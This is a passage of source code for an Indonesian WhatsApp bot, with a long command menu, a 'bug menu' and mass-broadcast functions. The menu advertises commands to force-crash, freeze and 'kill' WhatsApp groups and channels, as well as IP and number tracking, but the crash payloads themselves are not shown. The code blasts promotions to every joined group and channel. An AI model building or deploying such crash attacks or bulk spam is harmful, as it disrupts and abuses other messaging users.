͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
メ 𝙊𝙐𝙏𝙃𝙀𝙍 𝙈𝙀𝙉𝙐 メ
⛧  .ᴄᴇᴋɪᴅᴄʜ
⛧  .ᴄᴇᴋɪᴅɢᴄ
⛧  .ᴀᴅᴅɪᴄʜ
⛧  .ᴀᴅᴅᴀʟʟɪᴅᴄʜ
⛧  .ᴅᴇʟᴄʜ
⛧  .ʟɪsᴛɪᴅᴄʜ
⛧  .ᴏ̨ᴄ
⛧  .ʙʀᴀᴛ
⛧  .ʙʀᴀᴛᴠɪᴅ
⛧  .ʀᴇᴀᴅᴠɪᴇᴡᴏɴᴄᴇ
⛧  .sᴛɪᴄᴋᴇʀᴡᴍ
⛧  .sᴛɪᴄᴋᴇʀ
⛧  .ʀᴇᴍᴏᴠᴇʙɢ
⛧  .ᴠɪᴅᴇʏ
⛧  .ʙᴇʀɪᴛᴀᴊᴋᴛ48
⛧  .ʀᴇᴀᴄᴛᴄʜ

メ 𝙎𝙀𝘼𝙍𝘾𝙃 𝙈𝙀𝙉𝙐 メ
⛧  .ʏᴛs
⛧  .ᴀᴘᴋᴍᴏᴅ
⛧  .ᴘɪɴᴛᴇʀᴇsᴛ
⛧  .ɢɪᴍᴀɢᴇ
⛧  .sғɪʟᴇ
⛧  .ɢᴀᴍᴇ

メ 𝙇𝘼𝙔𝘼𝙉𝘼𝙉 𝙊𝙍𝙆𝙐𝙏 メ
⛧  .ʙᴜʏᴠᴘꜱ
⛧  .ʙᴜʏᴀᴅᴘ
⛧  .ʙᴜʏᴘᴀɴᴇʟ
⛧  .ʙᴜʏꜱᴄʀɪᴘᴛ
⛧  .ʙᴜʏɴᴏᴋᴏꜱ
⛧  .ʟɪꜱᴛɴᴏᴋᴏꜱ

メ 𝙏𝙊𝙊𝙇𝙎 𝙈𝙀𝙉𝙐 メ
⛧  .ᴀɪ
⛧  .ɢᴘᴛ
⛧  .ᴛᴏᴜʀʟ
⛧  .ᴛᴏᴜʀʟ2
⛧  .ssᴡᴇʙ
⛧  .ᴛʀᴀɴsʟᴀᴛᴇ
⛧  .ᴛᴏʜᴅ
⛧  .sʜᴏʀᴛʟɪɴᴋ
⛧  .sʜᴏʀᴛʟɪɴᴋ2
⛧  .ᴇɴᴄ
⛧  .ᴇɴᴄʜᴀʀᴅ
⛧  .ᴇɴᴄʀʏᴘ
⛧  .ᴇɴᴄʀʏᴘᴛʜᴀʀᴅ
⛧  .ᴄʀᴀᴄᴋᴇɴᴄ
⛧  .ʟᴀᴄᴀᴋɪᴘ
⛧  .ʟᴀᴄᴀᴋɴᴏᴍᴏʀ
⛧  .ʟᴀᴄᴀᴋᴋᴛᴘ
⛧  .ʟᴀᴄᴀᴋʟᴏᴋᴀꜱɪ
⛧  .ʙᴍᴋɢ
⛧  .ʟɪꜱᴛꜰɪᴛᴜʀ
⛧  .ᴜʙᴀʜꜱᴜᴀʀᴀ
⛧  .ᴜɴʙᴀɴ
⛧  .ᴛᴇᴍᴘʟᴀᴛᴇᴜɴʙᴀɴᴅ
⛧  .ʙᴀᴛᴀʟᴜɴʙᴀɴᴅ
⛧  .ʙᴀɴɴᴇᴅᴡᴀ
⛧  .ᴛᴇᴍᴘʟᴀᴛᴇʙᴀɴɴᴇᴅ
⛧  .ʙᴀᴛᴀʟʙᴀɴɴᴇᴅ
⛧  .ᴄʀᴇᴀᴛᴇᴡᴇʙ
⛧  .ᴄʀᴇᴀᴛᴇꜱᴄ

メ 𝘽𝙐𝙂 𝙈𝙀𝙉𝙐 メ
⛧  .ʙʟᴀɴᴋꜰᴄ
⛧  .ʙʟᴀɴᴋꜰʀᴇᴢᴇᴇ
⛧  .ʙʟᴀɴᴋᴄʀᴀꜱʜ
⛧  .ᴛʀᴀꜱʜ-ᴄʜ
⛧  .ᴢᴀᴋᴢᴢᴄʀᴀꜱʜ-ɢʙ
⛧  .ᴋɪʟʟ-ɢʙ
⛧  .ᴄʟᴇᴀʀʙᴜɢ

メ 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 𝙈𝙀𝙉𝙐 メ
⛧  .ᴛɪᴋᴛᴏᴋ
⛧  .ᴛɪᴋᴛᴏᴋᴍᴘ3
⛧  .ғᴀᴄᴇʙᴏᴏᴋ
⛧  .ᴄᴀᴘᴄᴜᴛ
⛧  .ɪɴsᴛᴀɢʀᴀᴍ
⛧  .ʏᴛᴍᴘ3
⛧  .ʏᴛᴍᴘ4
⛧  .ᴘʟᴀʏ
⛧  .ᴘʟᴀʏᴠɪᴅ
⛧  .ɢɪᴛᴄʟᴏɴᴇ
⛧  .ᴍᴇᴅɪᴀғɪʀᴇ

メ 𝙎𝙏𝙊𝙍𝙀 𝙈𝙀𝙉𝙐 メ
⛧  .ᴀᴅᴅʀᴇsᴘᴏɴ
⛧  .ᴅᴇʟʀᴇsᴘᴏɴ
⛧  .ʟɪsᴛʀᴇsᴘᴏɴ
⛧  .ᴅᴏɴᴇ
⛧  .ᴘʀᴏsᴇs
⛧  .ᴊᴘᴍ
⛧  .ᴊᴘᴍꜰᴏᴛᴏ
⛧  .ᴊᴘᴍᴠɪᴅᴇᴏ
⛧  .ᴊᴘᴍʜᴛ
⛧  .ᴊᴘᴍᴛᴇsᴛɪ
⛧  .ᴊᴘᴍsʟɪᴅᴇ
⛧  .ᴊᴘᴍᴄʜ
⛧  .ᴊᴘᴍᴄʜꜰᴏᴛᴏ
⛧  .ᴊᴘᴍᴄʜᴠɪᴅᴇᴏ
⛧  .ᴊᴘᴍᴄʜꜱᴛᴀᴛᴜꜱ
⛧  .ᴀᴜᴛᴏᴊᴘᴍᴄʜ
⛧  .ᴊᴘᴍsʟɪᴅᴇʜᴛ
⛧  .sᴇɴᴅᴛᴇsᴛɪ
⛧  .ᴘᴜsʜᴋᴏɴᴛᴀᴋ
⛧  .ᴘᴜsʜᴋᴏɴᴛᴀᴋ2
⛧  .ᴘᴀʏᴍᴇɴᴛ
⛧  .ᴘʀᴏᴅᴜᴋ

メ 𝘿𝙄𝙂𝙄𝙏𝘼𝙇𝙊𝘾𝙀𝘼𝙉 𝙈𝙀𝙉𝙐 メ
⛧  .ᴄᴠᴘs
⛧  .sɪsᴀᴅʀᴏᴘʟᴇᴛ
⛧  .ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
⛧  .ʟɪsᴛᴅʀᴏᴘʟᴇᴛ
⛧  .ʀᴇʙᴜɪʟᴅ
⛧  .ʀᴇsᴛᴀʀᴛᴠᴘs
⛧  .ᴄᴇᴋᴅᴀᴛᴀᴠᴘꜱ
⛧  .ᴄᴇᴋʀᴀᴍᴠᴘꜱ
⛧  .ʀᴇꜱᴇᴛᴘᴡᴠᴘꜱ

メ 𝘾𝙡𝙤𝙪𝙙𝙁𝙡𝙖𝙧𝙚 𝙢𝙚𝙣𝙪 メ
⛧  .ᴄꜰᴍᴏᴅᴇ
⛧  .ᴄᴇᴋᴅɴꜱ
⛧  .ᴄʟᴏᴜᴅꜰʟᴀʀᴇᴘʀᴏᴛᴇᴄᴛ
⛧  .ᴄʟᴏᴜᴅꜰʟᴀʀᴇɪᴘ
⛧  .ᴄꜰᴡʜᴏɪꜱ
⛧  .ᴄꜰᴛʀᴀᴄᴇ

メ 𝙋𝘼𝙉𝙀𝙇 𝙈𝙀𝙉𝙐 メ
⛧  .1gb
⛧  .2gb
⛧  .3gb
⛧  .4gb
⛧  .5gb
⛧  .6gb
⛧  .7gb
⛧  .8gb
⛧  .9gb
⛧  .10gb
⛧  .ʟɪɴᴋsᴇʀᴠᴇʀ
⛧  .ᴜɴʟɪᴍɪᴛᴇᴅ
⛧  .ᴄᴀᴅᴍɪɴ
⛧  .ᴅᴇʟᴘᴀɴᴇʟ
⛧  .ᴅᴇʟᴀᴅᴍɪɴ
⛧  .ʟɪsᴛᴘᴀɴᴇʟ
⛧  .ʟɪsᴛᴀᴅᴍɪɴ
⛧  .ᴅᴇʟᴇᴛᴇᴀʟʟᴜꜱᴇʀᴘᴀɴᴇʟ

メ 𝙋𝘼𝙉𝙀𝙇 𝙈𝙀𝙉𝙐 2 メ
⛧  .1gb-v2
⛧  .2gb-v2
⛧  .3gb-v2
⛧  .4gb-v2
⛧  .5gb-v2
⛧  .6gb-v2
⛧  .7gb-v2
⛧  .8gb-v2
⛧  .9gb-v2
⛧  .10gb-v2
⛧  .ʟɪɴᴋsᴇʀᴠᴇʀ
⛧  .ᴜɴʟɪᴍɪᴛᴇᴅ-ᴠ2
⛧  .ᴄᴀᴅᴍɪɴ-ᴠ2
⛧  .ᴅᴇʟᴘᴀɴᴇʟ-ᴠ2
⛧  .ᴅᴇʟᴀᴅᴍɪɴ-ᴠ2
⛧  .ʟɪsᴛᴘᴀɴᴇʟ-ᴠ2
⛧  .ʟɪsᴛᴀᴅᴍɪɴ-ᴠ2
⛧  .ᴅᴇʟᴇᴛᴇᴀʟʟᴜꜱᴇʀᴘᴀɴᴇʟ-ᴠ2
⛧  .ʟɪɴᴋꜱᴇʀᴠᴇʀ

メ 𝙄𝙉𝙎𝙏𝘼𝙇𝙇 𝙈𝙀𝙉𝙐 メ
⛧  .ʜᴀᴄᴋʙᴀᴄᴋᴘᴀɴᴇʟ
⛧  .ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
⛧  .ɪɴꜱᴛᴀʟʟᴛᴇᴍᴀ
⛧  .ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
⛧  .ᴜɴɪɴsᴛᴀʟʟᴛᴇᴍᴀ

メ 𝙂𝙍𝙊𝙐𝙋 𝙈𝙀𝙉𝙐 メ
⛧  .ᴀɴᴛɪʟɪɴᴋ
⛧  .ᴀɴᴛɪʟɪɴᴋ2
⛧  .ʙʟᴀᴄᴋʟɪsᴛᴊᴘᴍ
⛧  .ʙʟᴀᴄᴋʟɪꜱᴛᴀʟʟᴊᴘᴍ
⛧  .ᴡᴇʟᴄᴏᴍᴇ
⛧  .ᴀᴅᴅ
⛧  .ᴋɪᴄᴋ
⛧  .ᴄʟᴏsᴇ
⛧  .ᴏᴘᴇɴ
⛧  .ʜɪᴅᴇᴛᴀɢ
⛧  .ᴋᴜᴅᴇᴛᴀɢᴄ
⛧  .ʟᴇᴀᴠᴇ
⛧  .ᴛᴀɢᴀʟʟ
⛧  .ᴘʀᴏᴍᴏᴛᴇ
⛧  .ᴅᴇᴍᴏᴛᴇ
⛧  .ʀᴇsᴇᴛʟɪɴᴋɢᴄ
⛧  .ʟɪɴᴋɢᴄ
⛧  .ʙᴜᴀᴛɢʀᴜᴘ
⛧  .ꜱᴇᴛɢʙᴏɴʟʏ

メ 𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐 メ
⛧  .ᴀᴜᴛᴏᴘʀᴏᴍᴏsɪ
⛧  .ᴀᴜᴛᴏʀᴇᴀᴅsᴡ
⛧  .ᴀᴅᴅᴏᴡɴᴇʀ
⛧  .ʟɪsᴛᴏᴡɴᴇʀ
⛧  .ᴅᴇʟᴏᴡɴᴇʀ
⛧  .ᴀᴅᴅᴍᴏᴅ
⛧  .ᴅᴇʟᴍᴏᴅ
⛧  .ʟɪꜱᴛᴍᴏᴅ
⛧  .ᴀᴅᴅᴘʀᴇᴍ
⛧  .ᴅᴇʟᴘʀᴇᴍ
⛧  .ʟɪꜱᴛᴘʀᴇᴍ
⛧  .ᴀᴅᴅɢʀᴏᴜᴘᴘʀᴇᴍɪᴜᴍ
⛧  .ᴅᴇʟɢʀᴏᴜᴘᴘʀᴇᴍɪᴜᴍ
⛧  .ᴀᴅᴅᴅʙ
⛧  .ᴅᴇʟᴅʙ
⛧  .ʟɪꜱᴛᴅʙ
⛧  .sᴇʟғ/ᴘᴜʙʟɪᴄ
⛧  .sᴜʙᴅᴏᴍᴀɪɴ
⛧  .sᴇᴛɪᴍɢᴍᴇɴᴜ
⛧  .sᴇᴛɪᴍɢғᴀᴋᴇ
⛧  .sᴇᴛᴘᴘʙᴏᴛ
⛧  .ᴄʟᴇᴀʀsᴇssɪᴏɴ
⛧  .ᴄʟᴇᴀʀᴄʜᴀᴛ
⛧  .ʀᴇsᴇᴛᴅʙ
⛧  .ʀᴇsᴛᴀʀᴛʙᴏᴛ
⛧  .ɢᴇᴛsᴄ
⛧  .ɢᴇᴛᴄᴀsᴇ
⛧  .ᴀᴅᴅᴄᴀꜱᴇ
⛧  .ᴅᴇʟᴄᴀꜱᴇ
⛧  .ᴇᴅɪᴛᴄᴀꜱᴇ
⛧  .ʟɪsᴛɢᴄ
⛧  .ᴊᴏɪɴɢᴄ
⛧  .ᴊᴏɪɴᴄʜ
⛧  .ᴜᴘᴄʜᴀɴɴᴇʟ
⛧  .ᴜᴘᴄʜᴀɴɴᴇʟ2
  `

await ZakzzDev.sendMessage(m.chat, {
  video: fs.readFileSync('./AlwaysZakzz.mp4'),
  mimetype: 'video/mp4',
  gifPlayback: true,
  gifAttribution: 5,
  caption: teks,
  contextInfo: {
    mentionedJid: [m.sender],
    externalAdReply: {
      title: `${botname} - ${versi}`,
      body: 'AlwaysZakzz Official',
      thumbnail: fs.readFileSync('./AlwaysZakzz.jpg'),
      sourceUrl: 'https://alwayszakzz.web.id',
      mediaType: 1,
      renderLargerThumbnail: true,
    }
  }
}, { quoted: m });

await ZakzzDev.sendMessage(m.chat, {
  audio: fs.readFileSync('./AlwaysZakzz.mp3'),
  mimetype: 'audio/mpeg',
  ptt: true,
}, { quoted: m });
}
break

case "bugmenu": {
  const teks = `
┏━━━━━━ ⪩ 𝙱𝚄𝙶 𝙼𝙴𝙽𝚄 ⪨ ━━━━━━┓
┃   ꜱʏꜱᴛᴇᴍ ʙʏ ⟡ 𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩 ⚙️
┗━━━━━━━━━━━━━━━━━━━━━┛

┏⟡ 𝐅𝐂 – 𝙵𝚘𝚛𝚌𝚎 𝙲𝚛𝚊𝚜𝚑 ⚡
┃ ⤷ .ʙʟᴀɴᴋꜰᴄ
┃ ⤷ .ʙʟᴀɴᴋꜰʀᴇᴢᴇᴇ
┃ ⤷ .ʙʟᴀɴᴋᴄʀᴀꜱʜ
┗━━━━━━━━━━━━━━━━━━━━━━━┛

┏⟡ 𝐓𝐑𝐀𝐒𝐇 𝐆𝐁+𝐂𝐇 – 𝙲𝚛𝚊𝚜𝚑 𝙶𝚛𝚘𝚞𝚙 + 𝙲𝚑𝚊𝚗𝚗𝚎𝚕
┃ ⤷ .ᴋɪʟʟ-ɢʙ
┃ ⤷ .ᴢᴀᴋᴢᴢᴄʀᴀꜱʜ-ɢʙ
┃ ⤷ .ᴛʀᴀꜱʜ-ᴄʜ
┗━━━━━━━━━━━━━━━━━━━━━━━┛

📌 𝐍𝐎𝐓𝐄  
⚠️ ɢᴜɴᴀᴋᴀɴ ꜰɪᴛᴜʀ ᴅᴇɴɢᴀɴ ʙɪᴊᴀᴋ  
❌ ᴅɪʟᴀʀᴀɴɢ sᴘᴀᴍ ᴀᴛᴀᴜ ᴀʙᴜsᴇ  
🛠️ ʀᴇsɪᴋᴏ ᴅɪᴛᴀɴɢɢᴜɴɢ ᴘᴇɴɢɢᴜɴᴀ  

╰━━━⪩ 𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩 ʙᴜɢ ᴄᴇɴᴛᴇʀ ⪨━━━╯
`;

  await ZakzzDev.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        title: "𝕬𝖑𝖎𝖋𝖋𝗧𝘇𝘆𝘾𝙧𝙩-𝚒𝚘𝚗",
        body: `${botname} - ${versi}`,
        thumbnailUrl: "https://img1.pixhost.to/images/7898/631129927_alwayszakzz.jpg",
        mediaType: 1,
        renderLargerThumbnail: true,
        sourceUrl: "https://github.com/AlwaysZakzzDev"
      }
    }
  }, { quoted: m });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delete": case "del": {
if (m.isGroup) {
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.quoted) return m.reply("reply pesannya")
if (m.quoted.fromMe) {
ZakzzDev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!m.isBotAdmin) return Reply(mess.botAdmin)
ZakzzDev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted) return m.reply(example("reply pesan"))
ZakzzDev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "clsesi": case "clearsession": case "cls": {
const dirsesi = fs.readdirSync("./session").filter(e => e !== "creds.json")
const dirsampah = fs.readdirSync("./library/database/sampah").filter(e => e !== "A")
for (const i of dirsesi) {
await fs.unlinkSync("./session/" + i)
}
for (const u of dirsampah) {
await fs.unlinkSync("./library/database/sampah/" + u)
}
m.reply(`*Berhasil membersihkan sampah ✅*
*${dirsesi.length}* sampah session\n*${dirsampah.length}* sampah file`)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "unblok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await ZakzzDev.updateBlockStatus(mem, "unblock");
if (m.isGroup) ZakzzDev.sendMessage(m.chat, {text: `Berhasil membuka blokiran @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "sendtesti": case "testi": {
if (!isCreator) return Reply(global.mess.owner)
if (!text) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await ZakzzDev.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses jpm testimoni ke dalam channel & ${res.length} grup`)
await ZakzzDev.sendMessage(global.idSaluran, {image: await fs.readFileSync(rest), caption: teks})
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await ZakzzDev.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Nokos (Nomor kosong)',
                  id: '.buynokos'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await ZakzzDev.sendMessage(jid, {text: `Testimoni berhasil dikirim ke dalam channel & ${count} grup`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "jpmch": case "jpmchfoto": case "jpmchvideo": {
    try {
        const senderNum = m.sender.split('@')[0];
        const isOwner   = global.owner.includes(senderNum);
        const isMod     = global.mods.includes(senderNum);

        if (!isCreator && !isOwner && !isMod) {
            return m.reply(mess.owner);
        }

        if (isMod) {
            const cooldownKey = "jpmch_global_MODS";
            const now = Date.now();
            const cooldownTime = global.cooldownTimeJPM;

            if (global.cooldowns[cooldownKey] && now < global.cooldowns[cooldownKey]) {
                const sisa = Math.ceil((global.cooldowns[cooldownKey] - now) / 1000 / 60);
                return m.reply(`⏳ *Cooldown aktif!*\nTunggu *${sisa} menit* sebelum pakai lagi.`);
            }
            global.cooldowns[cooldownKey] = now + cooldownTime;
        }

        if (isOwner) {
            if (global.jpmProcessing) {
                return m.reply("⚠️ *Fitur Jpmch sedang dipakai Owner lain.*\n🕒 Tunggu proses selesai.");
            }
            global.jpmProcessing = true;
        }

        global.channels = loadChannels();
        if (!global.channels.length) {
            return m.reply(`❌ Tidak ada saluran terdaftar.\nSilakan daftarkan saluran terlebih dahulu.`);
        }

        if (!q && !m.quoted) {
            return m.reply("🚫 *`Bukan gitu anjing`*\nBalas dengan teks atau media yang ingin dikirim.");
        }

        const qmsg = m.quoted || m;
        const mime = (qmsg.msg || qmsg).mimetype || "";
        const captionText = args.join(" ") || m.quoted?.text || "";

        let mediaPath, mediaType, pesanMedia;

        if (m.quoted && /image/.test(m.quoted.mtype)) {
            mediaPath = await ZakzzDev.downloadAndSaveMediaMessage(m.quoted);
            mediaType = "image";
            pesanMedia = { image: fs.readFileSync(mediaPath), caption: captionText };
        } else if (m.quoted && /video/.test(m.quoted.mtype)) {
            mediaPath = await ZakzzDev.downloadAndSaveMediaMessage(m.quoted);
            mediaType = "video";
            pesanMedia = { video: fs.readFileSync(mediaPath), caption: captionText };
        } else if (/image/.test(mime)) {
            mediaPath = await ZakzzDev.downloadAndSaveMediaMessage(qmsg);
            mediaType = "image";
            pesanMedia = { image: fs.readFileSync(mediaPath), caption: captionText };
        } else if (/video/.test(mime)) {
            mediaPath = await ZakzzDev.downloadAndSaveMediaMessage(qmsg);
            mediaType = "video";
            pesanMedia = { video: fs.readFileSync(mediaPath), caption: captionText };
        } else {
            mediaType = "text";
            pesanMedia = { text: captionText };
        }

        let opsijpm = mediaType === "image" ? "Teks & Foto" : mediaType === "video" ? "Teks & Video" : "Teks";
        let count = 0;

        await m.reply(`╭─❰ *PROCESSING MESSAGES* ❱─╮
📨 *Jenis Kiriman*: ${opsijpm}
📤 *Jumlah Saluran*: ${global.channels.length}
🕒 *Status*: Mengirim, mohon tunggu...
╰─────────────────────╯`);

        for (let ch of global.channels) {
            try {
                await ZakzzDev.sendMessage(ch, pesanMedia, { quoted: m });
                count++;
            } catch (e) {
                console.log(`[JPM] Gagal kirim ke ${ch}:`, e.message);
            }
            await sleep(global.delayJpm);
        }

        if (mediaPath) fs.unlinkSync(mediaPath);

        await m.reply(`╭─❰ *PENGIRIMAN SELESAI* ❱─╮
✅ Berhasil Kirim Ke: ${count} Saluran
🗂️ Jenis: ${opsijpm}
⏳ Cooldown: Tunggu 15 menit Sebelum Kirim lagi.
╰─────────────────────╯`);

    } catch (err) {
        console.error(`[JPM ERROR]:`, err);
        m.reply("❌ *Terjadi kesalahan saat mengirim pesan.*");
    } finally {
        if (global.jpmProcessing) global.jpmProcessing = false;
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delidch": {
if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply("Harap masukkan nomor atau ID saluran yang ingin dihapus!");

    global.channels = loadChannels();

    if (!isNaN(text)) {
        let index = parseInt(text.trim()) - 1;

        if (index < 0 || index >= global.channels.length) {
            return m.reply("Nomor urut tidak valid!");
        }

        let removed = global.channels.splice(index, 1);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
    } else {
        let channelId = text.trim();

        if (!global.channels.includes(channelId)) {
            return m.reply("ID Saluran tidak ditemukan!");
        }

        global.channels = global.channels.filter((id) => id !== channelId);
        saveChannels(global.channels);

        m.reply(`Berhasil menghapus ID Saluran: *${channelId}*`);
    }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "listidch": {
    if (!isCreator) return m.reply(mess.owner);

    global.channels = loadChannels();

    if (global.channels.length === 0) {
        return m.reply("Belum ada ID saluran yang terdaftar!");
    }

    let list = global.channels
        .map((id, index) => `${index + 1}. ${id}`)
        .join("\n");

    m.reply(`Daftar ID Saluran Terdaftar:\n\n${list}`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case 'addidch':{
  if (!isCreator) return m.reply(mess.owner);

  let idChannel;

  if (!text && m.chat.endsWith("120363403066612655@newsletter")) {
    idChannel = m.chat;
    global.channels = loadChannels();

    if (global.channels.includes(idChannel)) {
      return m.reply(`ID Saluran *${idChannel}* sudah terdaftar!`);
    }

    global.channels.push(idChannel);
    saveChannels(global.channels);
    return m.reply(`✅ Berhasil menambahkan ID saluran dari dalam channel:\n*${idChannel}*`);

  } else if (text && text.includes("https://whatsapp.com/channel/")) {
    let channelLink = text.trim();
    let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
    if (!channelId) return m.reply("Gagal mengekstrak ID dari link saluran!");

    try {
      let res = await ZakzzDev.newsletterMetadata("invite", channelId);
      if (!res.id) return m.reply("ID saluran tidak valid!");

      global.channels = loadChannels();

      if (global.channels.includes(res.id)) {
        return m.reply(`ID Saluran *${res.id}* sudah terdaftar!`);
      }
      
      global.channels.push(res.id);
      saveChannels(global.channels);

      m.reply(`✅ Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\n📛 Nama Saluran: ${res.name}`);
    } catch (e) {
      console.error(e);
      m.reply("❌ Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
    }

  } else {
    return m.reply("Harap masukkan link saluran atau ketik langsung dari dalam saluran.");
  }
}
break

